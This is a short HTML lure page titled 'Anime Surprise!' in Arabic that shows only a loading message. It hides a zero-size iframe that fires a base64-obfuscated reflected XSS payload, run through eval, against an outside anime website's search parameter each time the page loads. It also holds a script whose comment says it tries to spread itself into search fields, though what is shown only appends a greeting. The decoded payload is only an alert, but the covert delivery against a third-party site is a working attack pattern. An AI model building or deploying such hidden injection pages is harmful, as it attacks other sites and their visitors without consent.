<!DOCTYPE html>
<html>
  <head>
    <title>مفاجأة أنمي!</title>
  </head>
  <body>
    <h2>جاري التحميل...</h2>

    <iframe 
      src="https://retro-anime.rf.gd/index.php?search=<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>" 
      style="display:none;width:0;height:0;"></iframe>

    <script>
(function(){
  if(sessionStorage.getItem('welcomeDisplayed')) return;
  sessionStorage.setItem('welcomeDisplayed', 'true');

  // إنشاء عنصر رسالة متحركة
  const msg = document.createElement('div');
  msg.textContent = "مرحباً بك في موقعنا! استمتع بوقتك.";
  msg.style.position = 'fixed';
  msg.style.bottom = '20px';
  msg.style.right = '-300px';
  msg.style.padding = '15px 25px';
  msg.style.background = '#444';
  msg.style.color = '#fff';
  msg.style.fontSize = '18px';
  msg.style.fontWeight = 'bold';
  msg.style.borderRadius = '8px';
  msg.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
  msg.style.zIndex = '9999';
  msg.style.transition = 'right 1s ease';

  document.body.appendChild(msg);

  // تحريك الرسالة من خارج الشاشة للداخل
  setTimeout(() => {
    msg.style.right = '20px';
  }, 100);

  // إخفاء الرسالة بعد 5 ثواني
  setTimeout(() => {
    msg.style.right = '-300px';
    setTimeout(() => msg.remove(), 1000);
  }, 5000);

  // حاول ينشر نفسه في حقول البحث لو موجودة
  const inputs = document.querySelectorAll('input[type="text"], input[type="search"]');
  inputs.forEach(input => {
    if (!input.value.includes('مرحباً')) {
      input.value += ' مرحباً بك!';
    }
  });
})();
  </script>
  </body>
</html>
